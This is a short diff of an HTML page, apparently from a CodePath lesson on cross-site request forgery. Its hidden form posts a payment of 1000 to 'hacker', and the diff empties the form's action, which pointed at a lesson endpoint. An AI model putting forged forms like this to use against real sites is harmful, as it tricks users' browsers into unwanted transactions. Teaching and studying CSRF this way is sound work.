@@ -1,6 +1,6 @@
 <h1>Welcome to my completely unhackable site.</h1>
 
-<form name="csrfForm" action="https://security.codepath.com/root/grantComplete/csrfLesson?userId=d115e0154d2d5da63b21ba985a5fbb7d86d48867" method="POST">
+<form name="csrfForm" action="" method="POST">
  <input type="hidden" name="giveMoneyTo" value="hacker" />
  <input type="hidden" name="giveAmount" value="1000" />
  <input type="submit"/>
